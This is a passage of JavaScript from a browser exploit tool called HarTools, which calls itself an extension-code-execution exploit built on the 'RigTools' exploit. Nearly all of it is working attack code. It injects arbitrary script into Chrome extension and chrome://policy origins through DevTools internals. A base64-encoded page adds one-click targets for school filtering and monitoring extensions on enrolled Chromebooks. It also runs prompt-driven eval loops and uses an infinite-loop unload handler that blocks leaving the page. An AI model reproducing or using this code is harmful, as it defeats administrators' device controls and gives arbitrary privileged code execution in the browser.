CAgdGV4dC1hbGlnbjogY2VudGVyOwogICAgICBtYXJnaW46IDA7CiAgICAgIHBhZGRpbmc6IDA7CiAgICAgIGRpc3BsYXk6IGZsZXg7CiAgICAgIGp1c3RpZnktY29udGVudDogY2VudGVyOwogICAgICBhbGlnbi1pdGVtczogY2VudGVyOwogICAgfQogIDwvc3R5bGU+IC0tPgo8L2JvZHk+Cgo8L2h0bWw+')}<script src="./index.js" ></script>`);
                    w.chrome.tabs.create({ url });
                    w.close();
                    cleanup();
                });


                // }, 5000);

            }
            document.open();
            document.write(atob(`CjwhRE9DVFlQRSBodG1sPgo8aHRtbCBsYW5nPSJlbiI+CiAgPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCIgLz4KICAgIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MS4wIiAvPgogICAgPHRpdGxlPkhhclRvb2xzPC90aXRsZT4KICAgIDxzdHlsZT4KICAgICAgQGltcG9ydCB1cmwoJ2h0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzMj9mYW1pbHk9R2Vpc3Q6aXRhbCxvcHN6LHdnaHRAMCwxNC4uMzIsMTAwLi45MDA7MSwxNC4uMzIsMTAwLi45MDAmZGlzcGxheT1zd2FwJyk7CgogICAgICBpZnJhbWUgewogICAgICAgIG9wYWNpdHk6IDA7CiAgICAgICAgd2lkdGg6IDA7CiAgICAgICAgaGVpZ2h0OiAwOwogICAgICB9CgogICAgICBib2R5IHsKICAgICAgICBmb250LWZhbWlseTogJ0dlaXN0Jywgc2Fucy1zZXJpZjsKICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMDAwMDAwOwogICAgICAgIGNvbG9yOiAjOGEyYmUyOwogICAgICAgIG1hcmdpbjogMDsKICAgICAgICBwYWRkaW5nOiAxNXB4OwogICAgICAgIG92ZXJmbG93OiBoaWRkZW47CiAgICAgIH0KCiAgICAgIC5iYWNrZ3JvdW5kLWdyaWQgewogICAgICAgIHBvc2l0aW9uOiBmaXhlZDsKICAgICAgICB0b3A6IDA7CiAgICAgICAgbGVmdDogMDsKICAgICAgICByaWdodDogMDsKICAgICAgICBib3R0b206IDA7CiAgICAgICAgYmFja2dyb3VuZC1pbWFnZTogcmFkaWFsLWdyYWRpZW50KCMzMzMgMXB4LCB0cmFuc3BhcmVudCAxcHgpOwogICAgICAgIGJhY2tncm91bmQtc2l6ZTogMnJlbSAycmVtOwogICAgICAgIHotaW5kZXg6IC0xOwogICAgICAgIGFuaW1hdGlvbjogbW92ZUdyaWQgNHMgbGluZWFyIGluZmluaXRlOwogICAgICAgIHRyYW5zaXRpb246IGJhY2tncm91bmQtcG9zaXRpb24teCA0MDBtczsKICAgICAgfQoKICAgICAgQGtleWZyYW1lcyBtb3ZlR3JpZCB7CiAgICAgICAgMCUgewogICAgICAgICAgYmFja2dyb3VuZC1wb3NpdGlvbjogMCAwOwogICAgICAgIH0KCiAgICAgICAgMTAwJSB7CiAgICAgICAgICBiYWNrZ3JvdW5kLXBvc2l0aW9uOiAycmVtIDJyZW07CiAgICAgICAgfQogICAgICB9CgogICAgICAuYmFja2dyb3VuZC1ncmlkOmhvdmVyIHsKICAgICAgICBiYWNrZ3JvdW5kLXBvc2l0aW9uLXg6IDJyZW07CiAgICAgIH0KCiAgICAgIGEgewogICAgICAgIGNvbG9yOiAjOGEyYmUyOwogICAgICAgIHRleHQtZGVjb3JhdGlvbjogbm9uZTsKICAgICAgfQoKICAgICAgYTpob3ZlciB7CiAgICAgICAgdGV4dC1kZWNvcmF0aW9uOiBub25lOwogICAgICB9CgogICAgICAubWFpbiB7CiAgICAgICAgdG9wOiA1MCU7CiAgICAgICAgbGVmdDogNTAlOwogICAgICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTsKICAgICAgICB0cmFuc2Zvcm06IHRyYW5zbGF0ZSgtNTAlLCAtNTAlKTsKICAgICAgICBib3JkZXI6IDFweCBzb2xpZCAjMWQxZDFkOwogICAgICAgIGZvbnQtd2VpZ2h0OiBib2xkOwogICAgICAgIHBhZGRpbmc6IDMwcHg7CiAgICAgICAgYm9yZGVyLXJhZGl1czogOHB4OwogICAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMDAwOwogICAgICAgIG1heC1oZWlnaHQ6IDkwdmg7CiAgICAgICAgb3ZlcmZsb3cteTogYXV0bzsKICAgICAgICB3aWR0aDogNzUlOwogICAgICB9CgogICAgICAuaGVhZGVyIHsKICAgICAgICBkaXNwbGF5OiBmbGV4OwogICAgICAgIGZsZXgtZGlyZWN0aW9uOiBjb2x1bW47CiAgICAgICAgYWxpZ24taXRlbXM6IGNlbnRlcjsKICAgICAgICBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsKICAgICAgICBtYXJnaW4tYm90dG9tOiAyMHB4OwogICAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgfQoKICAgICAgLmxvZ28gewogICAgICAgIHdpZHRoOiAzLjVlbTsKICAgICAgICBoZWlnaHQ6IGF1dG87CiAgICAgICAgbWFyZ2luLWJvdHRvbTogMTBweDsKICAgICAgfQoKICAgICAgLnRpdGxlLXRleHQgewogICAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgfQoKICAgICAgaDEgewogICAgICAgIGZvbnQtc2l6ZTogMi4yZW07CiAgICAgICAgbWFyZ2luOiAwOwogICAgICAgIGNvbG9yOiAjOGEyYmUyOwogICAgICAgIGZvbnQtd2VpZ2h0OiBib2xkOwogICAgICB9CgogICAgICAuYnV0dG9uIHsKICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjOGEyYmUyOwogICAgICAgIGNvbG9yOiBibGFjazsKICAgICAgICBwYWRkaW5nOiA4cHggMTJweDsKICAgICAgICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgICAgICAgZGlzcGxheTogaW5saW5lLWJsb2NrOwogICAgICAgIGZvbnQtc2l6ZTogMTRweDsKICAgICAgICBtYXJnaW46IDVweDsKICAgICAgICBjdXJzb3I6IHBvaW50ZXI7CiAgICAgICAgYm9yZGVyLXJhZGl1czogNnB4OwogICAgICAgIGZvbnQtd2VpZ2h0OiBib2xkOwogICAgICAgIHRyYW5zaXRpb246IGFsbCAwLjNzIGVhc2U7CiAgICAgIH0KCiAgICAgIC5idXR0b246aG92ZXIgewogICAgICAgIGJhY2tncm91bmQtY29sb3I6ICNlMmUyZTI7CiAgICAgICAgdHJhbnNmb3JtOiBzY2FsZSgxLjEpOwogICAgICB9CgogICAgICAuYnV0dG9uOmZvY3VzIHsKICAgICAgICBvdXRsaW5lOiBub25lOwogICAgICB9CgogICAgICBpbnB1dCwKICAgICAgc2VsZWN0LAogICAgICB0ZXh0YXJlYSB7CiAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogIzEyMTIxMjsKICAgICAgICBjb2xvcjogd2hpdGU7CiAgICAgICAgYm9yZGVyOiAxcHggc29saWQgIzMzMzsKICAgICAgICBwYWRkaW5nOiAxMHB4OwogICAgICAgIGJvcmRlci1yYWRpdXM6IDRweDsKICAgICAgICB3aWR0aDogMTAwJTsKICAgICAgICBtYXJnaW4tYm90dG9tOiAxNXB4OwogICAgICB9CgogICAgICBpbnB1dDpmb2N1cywKICAgICAgc2VsZWN0OmZvY3VzLAogICAgICB0ZXh0YXJlYTpmb2N1cyB7CiAgICAgICAgb3V0bGluZTogbm9uZTsKICAgICAgICBib3JkZXItY29sb3I6ICNhODEyZmY7CiAgICAgIH0KCiAgICAgIDo6cGxhY2Vob2xkZXIgewogICAgICAgIGNvbG9yOiAjYmJiOwogICAgICB9CiAgICA8L3N0eWxlPgogIDwvaGVhZD4KICA8Ym9keT4KICAgIDxkaXYgY2xhc3M9ImJhY2tncm91bmQtZ3JpZCI+PC9kaXY+CiAgICA8ZGl2IGNsYXNzPSJtYWluIj4KICAgICAgPGRpdiBjbGFzcz0iaGVhZGVyIj4KICAgICAgICA8aW1nIHNyYz0iaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Nyb3NzamJseS9IYXJUb29scy1yaWd0b29sczEyOHBsdXMvcmVmcy9oZWFkcy9tYWluL2hhcnRvb2xzLmdpZiIgYWx0PSJIYXJUb29scyBMb2dvIiBjbGFzcz0ibG9nbyIgLz4KICAgICAgICA8ZGl2IGNsYXNzPSJ0aXRsZS10ZXh0Ij4KICAgICAgICAgIDxoMT5IYXJUb29sczwvaDE+CiAgICAgICAgICA8cD5EZXZlbG9wZXIgVG9vbHMgYW5kIEV4dGVuc2lvbiBDb2RlIGV4ZWN1dGlvbjwvcD4KICAgICAgICA8L2Rpdj4KICAgICAgPC9kaXY+CgogICAgICA8cD5UaGlzIHdhcyBmb3VuZCBieSA8YSBocmVmPSJodHRwczovL2Nyb3NzamJseS5wYWdlcy5kZXYvIj5jcm9zc2pibHk8L2E+PGJyPk9yaWdpbmFsIFJpZ1Rvb2xzIEV4cGxvaXQgd2FzIGZvdW5kIGJ5IDxhIGhyZWY9Imh0dHBzOi8vZ2l0aHViLmNvbS9GV1NtYXNoZXIiPkZXU21hc2hlcjwvYT48L3A+CiAgICAgIDxocj4KICAgICAgPHA+QUtBOiBpZiBzb21lb25lIHRlbGxzIHlvdSB0aGF0IHRoZXkgbWFkZSB0aGlzLCB0aGV5J3JlIGx5aW5nIGFuZCB5b3Ugc2hvdWxkIGxhdWdoIGF0IHRoZW08L3A+CiAgICAgIDxocj4KICAgICAgPHA+QWRkaXRpb25hbCBjcmVkaXRzOiBEaXNjb3JkOiBAYXhxbXggKHRlc3RpbmcgYW5kIGhlbHBpbmcgd2l0aCBkZXZlbG9wbWVudCkgQHB3ZW4gKGlkZWFzKSB8IEdpdGh1YjogPGEgaHJlZj0iaHR0cHM6Ly9naXRodWIuY29tL0ZXU21hc2hlciI+RldTbWFzaGVyPC9hPiAob3JpZ2luYWwgcmlndG9vbHMgZXhwbG9pdCkgPGEgaHJlZj0iaHR0cHM6Ly9naXRodWIuY29tL0Jsb2JieS1Cb2kiPkJsb2JieSBCb2k8L2E+ICh0ZXN0aW5nIGFuZCBkZXZlbG9wbWVudCk8L3A+CiAgICAgIDxocj4KCiAgICAgIDxwPlByZXNzIFEgZm9yIGV2YWx1YXRpbmcgY29kZSB1bmRlciA8YSBjbGFzcz0iYnV0dG9uIiBpZD0iZXh0ZGJnIiBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCkiPmV4dGVuc2lvbiBpZDwvYT48L3A+CiAgICAgIDxwPk9yIHByZXNzIDEtOSBmb3Igc29tZSBoYXJkY29kZWQgZXh0ZW5zaW9uczwvcD4KICAgICAgPHA+CiAgICAgICAgPGEgY2xhc3M9ImJ1dHRvbiBoYXJkY29kZWQiIGV4dD0iYWRrY3BrcGdoYWhtYm9wa2pjaG9iaWVja2VvYW9lZW0iIGhyZWY9ImphdmFzY3JpcHQ6dm9pZCgwKSI+bHMgZmlsdGVyPC9hPgogICAgICAgIDxhIGNsYXNzPSJidXR0b24gaGFyZGNvZGVkIiBleHQ9Imhwa2Rva2FramdscHBlZWtmZWVrbWViZmFoYWRuZmxwIiBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCkiPmxzIGFsZXJ0PC9hPgogICAgICAgIDxhIGNsYXNzPSJidXR0b24gaGFyZGNvZGVkIiBleHQ9ImhhbGRsZ2xkcGxnbmdna2phYWZoZWxnaWFnbGFmYW5oIiBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCkiPmdvZ3VhcmRpYW48L2E+CiAgICAgICAgPGEgY2xhc3M9ImJ1dHRvbiBoYXJkY29kZWQiIGV4dD0ibW9laGtiYmNia2xta2NqaWJjYmJvb2ViZ3BvZ2Vqb2MiIGhyZWY9ImphdmFzY3JpcHQ6dm9pZCgwKSI+YXJpc3RvdGxlPC9hPgogICAgICAgIDxhIGNsYXNzPSJidXR0b24gaGFyZGNvZGVkIiBleHQ9ImttZmZlaGJpZGxhbGliZmVrbGFlZm5ja3BpZGJvZGZmIiBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCkiPmlib3NzPC9hPgogICAgICAgIDxhIGNsYXNzPSJidXR0b24gaGFyZGNvZGVkIiBleHQ9Im1sb2FqZm5tamNrZmpiZWVvZmNkYWVjYmVsbmJsZGVuIiBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCkiPnNuYXAmcmVhZDwvYT4KICAgICAgICA8YSBjbGFzcz0iYnV0dG9uIGhhcmRjb2RlZCIgZXh0PSJmb2dqZWFuamZiaW9tYmdobm1rbW1vcGhmZWNjamRraSIgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApIj5sb2NrZG93biBicm93c2VyPC9hPgogICAgICAgIDxhIGNsYXNzPSJidXR0b24gaGFyZGNvZGVkIiBleHQ9ImttcGpsaWxuZW1qY2lvaGpja2phZG1nbWljb2xkZ2xmIiBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCkiPmR5a25vdyBjbG91ZDwvYT4KICAgICAgICA8YSBjbGFzcz0iYnV0dG9uIGhhcmRjb2RlZCIgZXh0PSJnbmRtaGRjZWZiaGxjaGtoaXBjbm5ia2NtaWNuY2VoayIgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApIj5nZm9ybXMgbG9ja2VkIG1vZGUgKGVucm9sbGVkIGNicyk8L2E+CiAgICAgIDwvcD4KCiAgICAgIDxwPlByZXNzIE0gZm9yIGV2YWx1YXRpbmcgdW5kZXIgPGEgY2xhc3M9ImJ1dHRvbiIgaWQ9ImRldmRiZyIgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApIj5kZXZ0b29sczwvYT4gY29udGV4dDwvcD4KICAgICAgPHA+VHlwaW5nIGNhbmNlbCBpbiBhbnkgcHJvbXB0IHdpbGwgY2FuY2VsIHRoZSBjdXJyZW50IG9wZXJhdGlvbi48L3A+CgogICAgICA8YSBjbGFzcz0iYnV0dG9uIiBocmVmPSJkZXZ0b29sczovL2RldnRvb2xzL2J1bmRsZWQvZGV2dG9vbHNfYXBwLmh0bWw/ZXhwZXJpbWVudHM9dHJ1ZSZ3cz0lJXVwZGF0ZXJ1cmwlJSI+UmUtb3BlbiBkZXZ0b29sczwvYT4KICAgICAgPGEgY2xhc3M9ImJ1dHRvbiIgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApIiBpZD0idXBkYXRlciI+VXBkYXRlIHBheWxvYWQ8L2E+CiAgICAgIDxhIGNsYXNzPSJidXR0b24iIGhyZWY9ImphdmFzY3JpcHQ6dm9pZCgwKSIgaWQ9ImNsZWFudXAiPkNsZWFudXAgYW5kIHJlc2V0IGZvciBleHRlbnNpb248L2E+CiAgICAgIDxhIGNsYXNzPSJidXR0b24iIGhyZWY9ImphdmFzY3JpcHQ6dm9pZCgwKSIgaWQ9ImFjdGl2YXRlIj5DaHJvbWUgVVJMczwvYT4KICAgICAgPGEgY2xhc3M9ImJ1dHRvbiIgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApIiBpZD0iYWN0aXZhdGUyIj5DaHJvbWUgVVJMcyAyPC9hPgogICAgPC9kaXY+CgogICAgPHNjcmlwdCBkZWZlcj4KICAgICAgZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigia2V5ZG93biIsIGZ1bmN0aW9uKGV2ZW50KSB7CiAgICAgICAgaWYgKGV2ZW50LmtleSA9PT0gInEiKSB7CiAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZXh0ZGJnIikuY2xpY2soKTsKICAgICAgICB9IGVsc2UgaWYgKGV2ZW50LmtleSA9PT0gIm0iKSB7CiAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZGV2ZGJnIikuY2xpY2soKTsKICAgICAgICB9IGVsc2UgaWYgKFsiMSIsICIyIiwgIjMiLCAiNCIsICI1IiwgIjYiLCAiNyIsICI4IiwgIjkiXS5pbmNsdWRlcyhldmVudC5rZXkpKSB7CiAgICAgICAgICBjb25zb2xlLmxvZyhldmVudC5rZXkpOwogICAgICAgICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvcihgcCAuaGFyZGNvZGVkOm50aC1jaGlsZCgke3BhcnNlSW50KGV2ZW50LmtleSl9KWApLmNsaWNrKCk7CiAgICAgICAgfQogICAgICB9KTsKICAgIDwvc2NyaXB0PgogIDwvYm9keT4KPC9odG1sPg==`));
            document.querySelector('#activate').onclick = function () {
                dbgext(false, pdfId);
            }
            onunload = function () {
                while (true);
            }
            document.close();
            document.title = "Dashboard";
            document.querySelector('#activate2').onclick = function (ev) {

                function xd(w) {
                    w.close();
                    const pdfId = "mhjfbmdgcfjbbpaeojofohoefgiehjai"; // Redefinition because we convert this function to a string
                    const mojoURL = "chrome://resources/mojo/mojo/public/js/bindings.js";
                    chrome.tabs.getCurrent(function (tab) {
                        console.log(tab);
                        chrome.windows.create({ url: mojoURL, setSelfAsOpener: true }, function (info) {
                            async function createAndWriteFile() {
                                function writeFile(filename, content) {
                                    return new Promise((resolve) => {
                                        webkitRequestFileSystem(TEMPORARY, 2 * 1024 * 1024, function (fs) {
                                            fs.root.getFile(filename, { create: true }, function (entry) {
                                                entry.remove(function () {
                                                    fs.root.getFile(filename, { create: true }, function (entry) {
                                                        entry.createWriter(function (writer) {
                                                            writer.write(new Blob([content]))
                                                            writer.onwriteend = function () {
                                                                resolve(entry.toURL());
                                                            }
                                                        })
                                                    })
                                                })
                                            })
                                        })
                                    })

                                }
                                const htmlFile = `<html>
                                <head></head><body><iframe src="filesystem:chrome://extensions/temporary/nothing.html"></iframe>
                                </html>
                                <script>
                                onerror=  alert;
                                if (top !== window) {
                                    top.location.replace(location.href);
                                };
                                </script>
                                `
                                
                                // alert(url);
                                opener.postMessage({ url: (await writeFile('index.html', htmlFile))}, '*');
                                setTimeout(function () {
                                    close();
                                }, 800);
                            }
                            chrome.tabs.executeScript(info.tabs[0].id, { code: `(${createAndWriteFile.toString()})()` });
                            function m2(url) {
                                // alert(url);
                                onmessage = function (data) {
                                    if (data.data.type === "ack") {
                                        
                                        // chrome.tabs.getCurrent(function (tab) {
                                            // alert("navigating");
                                            top.location.replace("")
                                        // })
                                    }
                                }
                                top.postMessage({ type: 'acc' }, '*');
                            }
                            onmessage = function (dat) {
                                if (dat.data.url) {
                                    m2(dat.data.url);
                                }
                            };
                        })
                    })

                }
                dbgext(false, pdfId, xd.toString());
            }
            onmessage = function (ev) {
                if (ev.data.type === "browserInitNavigate") {
                    alert(1);
                    ev.source.location.replace(ev.data.url);
                }
            }
            document.querySelector('#updater').onclick = function (ev) {
                onunload = null;
                const ws = new WebSocket("ws://%%updaterurl%%");

                ws.onopen = function () {
                    ws.onmessage = function (ev) {
                        const received = JSON.parse(ev.data);
                        const savedURL = received.params.request.url;
                        ws.close();
                        const w = open('', '_blank');
                        console.log(savedURL);
                        w.eval(`setTimeout(function () {opener.open(atob("${btoa(savedURL)}"), '_blank'); window.close()}, 500);`);
                        setTimeout(() => { location.reload() });
                    }
                    ws.send(JSON.stringify({
                        method: "Target.setDiscoverTargets",
                        id: 999,
                        params: {}
                    }));
                }

            }
            onmessage = function (d) {
                if (d.data.type === "acc") {
                    onunload = function () { while (true); };
                    d.source.postMessage({ type: "ack" }, '*');
                    
                };

                if (!globalMap[d.data.uid]) return;

                for (const frame of globalMap) {
                    if (!frame) continue;
                    if (frame.idx === d.data.uid) {
                        frame.remove();
                        delete globalMap[globalMap.indexOf(frame)];
                        return;
                    }
                }
            }
            function dbgext(cleanup, id, payload) {
                let x = id;
                while (!x) {
                    x = prompt('Extension id?');
                    if (x === "cancel") {
                        return;
                    }
                }
                let path = '//manifest.json';
                let is_pdf = false;
                let injected = payload ?? payload_swamp.toString();
                if (x === pdfId) {
                    path = "index.html"; // pdf viewer hack
                    is_pdf = true;
                    const b = prompt("code to execute!");
                    if (!b) return;
                    injected = injected.replace('%%CHROMEPAYLOAD%%', btoa(b));
                    InspectorFrontendHost.setInjectedScriptForOrigin('chrome://policy', b+'//');
                    
                }
                const URL_1 = `chrome-extension://${x ??
                    alert("NOTREACHED")}/${path}`;
                InspectorFrontendHost.setInjectedScriptForOrigin(new URL(URL_1).origin, `window.cleanup = ()=>{window.parent.postMessage({type: "remove", uid: window.sys.passcode}, '*');} ;onmessage = function (data) {window.sys = data.data; const w = open(origin + '/${path}'); w.onload = function () {(${injected})(w, data.data)} }//`);
                const ifr = document.createElement("iframe");
                ifr.src = URL_1;
                document.body.appendChild(ifr);
                const ifrid = globalMap.push(ifr) - 1;
                ifr.idx = ifrid;
                ifr.onload = function () {

                    ifr.contentWindow.postMessage({
                        type: "uidpass", passcode:
                            ifrid,
                        cleanup: cleanup
                    }, '*');
                    // console.log('hi');
                }
                // alert(1);

            }
            document.querySelector('#extdbg').onclick = function () {
                dbgext(false);
            }
            document.querySelectorAll('.hardcoded').forEach(el => {el.onclick = function () {
                let extid = el.getAttribute("ext");
                console.log(el.innerText, extid);
                dbgext(false, extid);
                }
            });
            document.querySelector('#cleanup').onclick = function () {
                dbgext(true);
            }
            document.querySelector('#devdbg').onclick = function () {
                var l_canceled = false;
                const id = setTimeout(function m() {
                    if (l_canceled) return;
                    (new Function(prompt("Evaluate script! (type 'cancel' to cancel)")))();
                    if (!l_canceled) setTimeout(m, 0);
                    clearTimeout(id);
                });
                Object.defineProperty(window, 'cancel', {
                    get: function () {
                        l_canceled = true;
                    }, configurable: true
                })
                return;
            }
            console.log(globalMap);
        }
        w.eval(`(${ui.toString()})()`);
        window.close();

    }

    function sleep(ms) {
        return new Promise(resolve => {
            setTimeout(resolve, ms);
        });
    }
})
)()
